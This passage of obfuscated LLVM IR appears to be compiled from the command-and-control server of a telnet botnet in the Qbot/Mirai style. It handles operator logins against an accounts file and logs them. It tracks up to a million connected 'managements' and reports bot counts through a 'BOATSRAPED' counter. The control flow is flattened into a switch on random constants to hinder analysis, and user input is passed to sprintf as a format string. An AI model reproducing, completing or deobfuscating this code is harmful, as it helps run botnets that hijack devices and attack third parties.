  %49 = add nsw i32 %48, 1
  store volatile i32 %49, i32* @managesConnected, align 4
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8** %12, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i32 0, i32 0), i8** %13, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8** %14, align 8
  store i32 0, i32* %16, align 4
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 2048, i32 16, i1 false)
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %19, align 4
  %53 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %53, %struct._IO_FILE** %18, align 8
  %switchVar = alloca i32
  store i32 -621305390, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -621305390, label %54
    i32 1090552653, label %60
    i32 -7866607, label %65
    i32 1957623202, label %67
    i32 -802760395, label %73
    i32 800648392, label %93
    i32 -229554443, label %99
    i32 1648279649, label %100
    i32 -1195336969, label %106
    i32 -843098615, label %107
    i32 -1895554770, label %108
    i32 -48182058, label %118
    i32 -1393625854, label %119
    i32 -888240989, label %125
    i32 -2128019362, label %126
    i32 -571371278, label %151
    i32 313759762, label %161
    i32 437208120, label %162
    i32 345932698, label %168
    i32 623181016, label %169
    i32 1787685365, label %180
    i32 1543828739, label %181
    i32 852587498, label %183
    i32 -1043873404, label %184
    i32 -1685578702, label %189
    i32 1699354788, label %190
    i32 -1290686825, label %197
    i32 -2070009622, label %202
    i32 1027396778, label %203
    i32 153759950, label %218
    i32 640671443, label %219
    i32 530523432, label %237
    i32 637741982, label %243
    i32 -31538516, label %248
    i32 -155189630, label %253
    i32 820719383, label %258
    i32 1315622601, label %260
    i32 1646006098, label %264
    i32 -1238681721, label %272
    i32 684551040, label %278
    i32 -1233052753, label %287
    i32 1332508024, label %307
    i32 -1784412686, label %308
    i32 569834660, label %310
    i32 1562140721, label %311
    i32 893776319, label %314
    i32 1780686218, label %325
    i32 238743531, label %326
    i32 659978426, label %327
    i32 170157227, label %332
    i32 -1087853041, label %343
    i32 371734745, label %344
    i32 -416930563, label %345
    i32 -1390778586, label %350
    i32 643232779, label %371
    i32 750869019, label %372
    i32 -283905322, label %373
    i32 1543435992, label %378
    i32 -1978137925, label %388
    i32 1376370818, label %389
    i32 97331076, label %399
    i32 116223056, label %400
    i32 1065999748, label %410
    i32 -1627707291, label %411
    i32 1129517525, label %412
    i32 1589651124, label %417
    i32 612304214, label %427
    i32 295869015, label %428
    i32 -2147469229, label %438
    i32 2039093834, label %439
    i32 1814769953, label %449
    i32 1773469957, label %450
    i32 -596451673, label %451
    i32 -1277591357, label %456
    i32 -712016774, label %466
    i32 1749343821, label %476
    i32 -546439021, label %486
    i32 446352369, label %487
    i32 69227980, label %497
    i32 -1055144571, label %498
    i32 1196637013, label %508
    i32 926499919, label %509
    i32 -1824756271, label %519
    i32 308920592, label %520
    i32 -1893451340, label %530
    i32 1974493295, label %531
    i32 911124475, label %532
    i32 -849284405, label %542
    i32 -151197069, label %543
    i32 -1986171632, label %544
    i32 1107192581, label %545
    i32 -6841393, label %550
    i32 1714003181, label %560
    i32 2094472058, label %561
    i32 -736509453, label %571
    i32 -1368395742, label %572
    i32 2039774232, label %573
    i32 1728064224, label %578
    i32 18266575, label %583
    i32 -552941679, label %593
    i32 -1277388322, label %594
    i32 -937284162, label %599
    i32 1226138082, label %600
    i32 467106855, label %617
    i32 -399374533, label %622
    i32 418127877, label %639
    i32 -2087162627, label %644
    i32 -586185379, label %649
    i32 -1949477042, label %650
    i32 982798375, label %651
    i32 -1636707554, label %656
    i32 -79539252, label %666
    i32 -1420994877, label %676
    i32 185426347, label %686
    i32 -2057198209, label %687
    i32 -797897037, label %688
    i32 540006542, label %692
    i32 570292890, label %701
    i32 -462916123, label %709
    i32 1958534612, label %725
    i32 1057823068, label %726
    i32 573169261, label %727
    i32 -396241523, label %728
    i32 -1770316660, label %731
    i32 1216108839, label %732
    i32 -2066279248, label %742
    i32 -151677497, label %743
    i32 1228708119, label %744
    i32 1512487413, label %745
    i32 -466629872, label %750
    i32 -921081026, label %760
    i32 880195429, label %770
    i32 954752167, label %775
    i32 168766848, label %780
    i32 -1676907367, label %791
    i32 826393634, label %795
    i32 -880802308, label %805
    i32 1214258676, label %820
    i32 -33202122, label %821
    i32 -835742820, label %838
    i32 1274430543, label %839
    i32 2071546651, label %840
    i32 1586664638, label %841
    i32 130053431, label %844
    i32 2119401692, label %845
    i32 -1931554778, label %850
    i32 -673212080, label %855
    i32 -1753751119, label %878
    i32 -1561813054, label %879
    i32 1651627661, label %896
    i32 -1964519420, label %897
    i32 1597313197, label %898
    i32 1497470075, label %899
    i32 -363287900, label %900
    i32 1809221864, label %910
    i32 -2060250181, label %911
    i32 760002470, label %912
    i32 -248424997, label %913
    i32 876786499, label %918
    i32 1368211106, label %928
    i32 -1403570511, label %938
    i32 1756796143, label %965
    i32 -1135345566, label %966
    i32 -1454888108, label %978
    i32 -1047123597, label %988
    i32 1207301736, label %989
    i32 -891847607, label %990
    i32 432440295, label %991
    i32 -1049248292, label %996
    i32 698755521, label %997
    i32 -1788100711, label %1013
    i32 602820483, label %1014
    i32 1158911300, label %1019
    i32 572889096, label %1020
    i32 1283301795, label %1043
    i32 182375132, label %1044
    i32 -513466081, label %1053
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %56 = call i32 @feof(%struct._IO_FILE* %55) #7
  %57 = icmp ne i32 %56, 0
  %58 = xor i1 %57, true
  %59 = select i1 %58, i32 1090552653, i32 -7866607
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %62 = call i32 @fgetc(%struct._IO_FILE* %61)
  store i32 %62, i32* %20, align 4
  %63 = load i32, i32* %19, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %19, align 4
  store i32 -621305390, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 0, i32* %21, align 4
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  call void @rewind(%struct._IO_FILE* %66)
  store i32 1957623202, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %21, align 4
  %69 = load i32, i32* %19, align 4
  %70 = sub nsw i32 %69, 1
  %71 = icmp ne i32 %68, %70
  %72 = select i1 %71, i32 -802760395, i32 800648392
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %75 = load i32, i32* %21, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %76
  %78 = getelementptr inbounds %struct.account, %struct.account* %77, i32 0, i32 0
  %79 = getelementptr inbounds [200 x i8], [200 x i8]* %78, i32 0, i32 0
  %80 = load i32, i32* %21, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %81
  %83 = getelementptr inbounds %struct.account, %struct.account* %82, i32 0, i32 1
  %84 = getelementptr inbounds [200 x i8], [200 x i8]* %83, i32 0, i32 0
  %85 = load i32, i32* %21, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %86
  %88 = getelementptr inbounds %struct.account, %struct.account* %87, i32 0, i32 2
  %89 = getelementptr inbounds [200 x i8], [200 x i8]* %88, i32 0, i32 0
  %90 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %74, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* %79, i8* %84, i8* %89)
  %91 = load i32, i32* %21, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %21, align 4
  store i32 1957623202, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %95 = load i32, i32* %4, align 4
  %96 = call i32 @fdgets(i8* %94, i32 2048, i32 %95)
  %97 = icmp slt i32 %96, 1
  %98 = select i1 %97, i32 -229554443, i32 1648279649
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %102 = load i8*, i8** %14, align 8
  %103 = call i8* @strstr(i8* %101, i8* %102) #8
  %104 = icmp ne i8* %103, null
  %105 = select i1 %104, i32 -1195336969, i32 -843098615
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -1895554770, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %110 = call i32 (i8*, i8*, ...) @sprintf(i8* %109, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i32 0, i32 0)) #7
  %111 = load i32, i32* %4, align 4
  %112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %114 = call i64 @strlen(i8* %113) #8
  %115 = call i64 @send(i32 %111, i8* %112, i64 %114, i32 16384)
  %116 = icmp eq i64 %115, -1
  %117 = select i1 %116, i32 -48182058, i32 -1393625854
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %121 = load i32, i32* %4, align 4
  %122 = call i32 @fdgets(i8* %120, i32 2048, i32 %121)
  %123 = icmp slt i32 %122, 1
  %124 = select i1 %123, i32 -888240989, i32 -2128019362
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %127)
  %128 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %129 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %130 = call i32 (i8*, i8*, ...) @sprintf(i8* %128, i8* %129) #7
  %131 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %131, i8** %9, align 8
  %132 = load i8*, i8** %9, align 8
  %133 = call i32 @Search_in_File(i8* %132)
  store i32 %133, i32* %5, align 4
  %134 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %134, %struct._IO_FILE** %22, align 8
  %135 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %136 = load i8*, i8** %9, align 8
  %137 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %135, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %136)
  %138 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %139 = call i32 @fclose(%struct._IO_FILE* %138)
  %140 = load i8*, i8** %9, align 8
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i32 0, i32 0), i8* %140)
  %142 = load i8*, i8** %9, align 8
  %143 = load i32, i32* %5, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %144
  %146 = getelementptr inbounds %struct.account, %struct.account* %145, i32 0, i32 0
  %147 = getelementptr inbounds [200 x i8], [200 x i8]* %146, i32 0, i32 0
  %148 = call i32 @strcmp(i8* %142, i8* %147) #8
  %149 = icmp eq i32 %148, 0
  %150 = select i1 %149, i32 -571371278, i32 852587498
  store i32 %150, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %153 = call i32 (i8*, i8*, ...) @sprintf(i8* %152, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i32 0, i32 0)) #7
  %154 = load i32, i32* %4, align 4
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %157 = call i64 @strlen(i8* %156) #8
  %158 = call i64 @send(i32 %154, i8* %155, i64 %157, i32 16384)
  %159 = icmp eq i64 %158, -1
  %160 = select i1 %159, i32 313759762, i32 437208120
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %164 = load i32, i32* %4, align 4
  %165 = call i32 @fdgets(i8* %163, i32 2048, i32 %164)
  %166 = icmp slt i32 %165, 1
  %167 = select i1 %166, i32 345932698, i32 623181016
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %170)
  %171 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %172 = load i32, i32* %5, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %173
  %175 = getelementptr inbounds %struct.account, %struct.account* %174, i32 0, i32 1
  %176 = getelementptr inbounds [200 x i8], [200 x i8]* %175, i32 0, i32 0
  %177 = call i32 @strcmp(i8* %171, i8* %176) #8
  %178 = icmp ne i32 %177, 0
  %179 = select i1 %178, i32 1787685365, i32 1543828739
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -1043873404, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %182, i8 0, i64 2048, i32 16, i1 false)
  store i32 -1290686825, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 -1043873404, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %4, align 4
  %186 = call i64 @send(i32 %185, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i64 5, i32 16384)
  %187 = icmp eq i64 %186, -1
  %188 = select i1 %187, i32 -1685578702, i32 1699354788
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %191, %struct._IO_FILE** %23, align 8
  %192 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %193 = load i8*, i8** %9, align 8
  %194 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %192, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0), i8* %193)
  %195 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %196 = call i32 @fclose(%struct._IO_FILE* %195)
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i32, i32* %4, align 4
  %199 = call i64 @send(i32 %198, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 14, i32 16384)
  %200 = icmp eq i64 %199, -1
  %201 = select i1 %200, i32 -2070009622, i32 1027396778
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %206
  %208 = getelementptr inbounds %struct.account, %struct.account* %207, i32 0, i32 0
  %209 = getelementptr inbounds [200 x i8], [200 x i8]* %208, i32 0, i32 0
  %210 = call i32 (i8*, i8*, ...) @sprintf(i8* %204, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %209) #7
  %211 = load i32, i32* %4, align 4
  %212 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %213 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %214 = call i64 @strlen(i8* %213) #8
  %215 = call i64 @send(i32 %211, i8* %212, i64 %214, i32 16384)
  %216 = icmp eq i64 %215, -1
  %217 = select i1 %216, i32 153759950, i32 640671443
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %3, align 8
  %221 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %220) #7
  %222 = load i32, i32* %4, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %223
  %225 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %224, i32 0, i32 2
  %226 = getelementptr inbounds [20 x i8], [20 x i8]* %225, i32 0, i32 0
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %228
  %230 = getelementptr inbounds %struct.account, %struct.account* %229, i32 0, i32 0
  %231 = getelementptr inbounds [200 x i8], [200 x i8]* %230, i32 0, i32 0
  %232 = call i32 (i8*, i8*, ...) @sprintf(i8* %226, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %231) #7
  %233 = load i32, i32* %4, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %234
  %236 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %235, i32 0, i32 1
  store i32 1, i32* %236, align 4
  store i32 530523432, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %239 = load i32, i32* %4, align 4
  %240 = call i32 @fdgets(i8* %238, i32 2048, i32 %239)
  %241 = icmp sgt i32 %240, 0
  %242 = select i1 %241, i32 637741982, i32 1283301795
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %245 = call i8* @strstr(i8* %244, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %246 = icmp ne i8* %245, null
  %247 = select i1 %246, i32 820719383, i32 -31538516
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %250 = call i8* @strstr(i8* %249, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i32 0, i32 0)) #8
  %251 = icmp ne i8* %250, null
  %252 = select i1 %251, i32 820719383, i32 -155189630
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %255 = call i8* @strstr(i8* %254, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i32 0, i32 0)) #8
  %256 = icmp ne i8* %255, null
  %257 = select i1 %256, i32 820719383, i32 659978426
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i32 @joinn()
  store i32 1, i32* %26, align 4
  store i32 0, i32* %25, align 4
  store i32 1315622601, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load i32, i32* %25, align 4
  %262 = icmp slt i32 %261, 40
  %263 = select i1 %262, i32 1646006098, i32 893776319
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %25, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %266
  %268 = getelementptr inbounds %struct.name, %struct.name* %267, i32 0, i32 1
  %269 = load i32, i32* %268, align 4
  %270 = icmp sle i32 %269, 0
  %271 = select i1 %270, i32 -1238681721, i32 684551040
  store i32 %271, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i32, i32* %25, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %274
  %276 = getelementptr inbounds %struct.name, %struct.name* %275, i32 0, i32 0
  %277 = getelementptr inbounds [512 x i8], [512 x i8]* %276, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %277, i8 0, i64 512, i32 4, i1 false)
  store i32 684551040, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %25, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %280
  %282 = getelementptr inbounds %struct.name, %struct.name* %281, i32 0, i32 0
  %283 = getelementptr inbounds [512 x i8], [512 x i8]* %282, i32 0, i32 0
  %284 = call i64 @strlen(i8* %283) #8
  %285 = icmp uge i64 %284, 1
  %286 = select i1 %285, i32 -1233052753, i32 569834660
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %289 = load i32, i32* %25, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %290
  %292 = getelementptr inbounds %struct.name, %struct.name* %291, i32 0, i32 0
  %293 = getelementptr inbounds [512 x i8], [512 x i8]* %292, i32 0, i32 0
  %294 = load i32, i32* %25, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %295
  %297 = getelementptr inbounds %struct.name, %struct.name* %296, i32 0, i32 1
  %298 = load i32, i32* %297, align 4
  %299 = call i32 (i8*, i8*, ...) @sprintf(i8* %288, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i32 0, i32 0), i8* %293, i32 %298) #7
  %300 = load i32, i32* %4, align 4
  %301 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %302 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %303 = call i64 @strlen(i8* %302) #8
  %304 = call i64 @send(i32 %300, i8* %301, i64 %303, i32 16384)
  %305 = icmp eq i64 %304, -1
  %306 = select i1 %305, i32 1332508024, i32 -1784412686
  store i32 %306, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %309, i8 0, i64 512, i32 16, i1 false)
  store i32 569834660, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 1562140721, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i32, i32* %25, align 4
  %313 = add nsw i32 %312, 1
  store i32 %313, i32* %25, align 4
  store i32 1315622601, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %316 = call i32 @clientsConnected()
  %317 = call i32 (i8*, i8*, ...) @sprintf(i8* %315, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i32 0, i32 0), i32 %316) #7
  %318 = load i32, i32* %4, align 4
  %319 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %320 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %321 = call i64 @strlen(i8* %320) #8
  %322 = call i64 @send(i32 %318, i8* %319, i64 %321, i32 16384)
  %323 = icmp eq i64 %322, -1
  %324 = select i1 %323, i32 1780686218, i32 238743531
  store i32 %324, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  store i32 659978426, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %329 = call i8* @strstr(i8* %328, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0)) #8
  %330 = icmp ne i8* %329, null
  %331 = select i1 %330, i32 170157227, i32 -416930563
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %334 = load volatile i32, i32* @BOATSRAPED, align 4
  %335 = call i32 (i8*, i8*, ...) @sprintf(i8* %333, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i32 0, i32 0), i32 %334) #7
  %336 = load i32, i32* %4, align 4
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %339 = call i64 @strlen(i8* %338) #8
  %340 = call i64 @send(i32 %336, i8* %337, i64 %339, i32 16384)
  %341 = icmp eq i64 %340, -1
  %342 = select i1 %341, i32 -1087853041, i32 371734745
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 371734745, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  store i32 -416930563, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %347 = call i8* @strstr(i8* %346, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0)) #8
  %348 = icmp ne i8* %347, null
  %349 = select i1 %348, i32 -1390778586, i32 -283905322
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %352 = call i8* @strtok(i8* %351, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %352, i8** %30, align 8
  %353 = load i8*, i8** %30, align 8
  %354 = getelementptr inbounds i8, i8* %353, i64 8
  store i8* %354, i8** %31, align 8
  %355 = load i8*, i8** %31, align 8
  call void @trim(i8* %355)
  %356 = load i8*, i8** %31, align 8
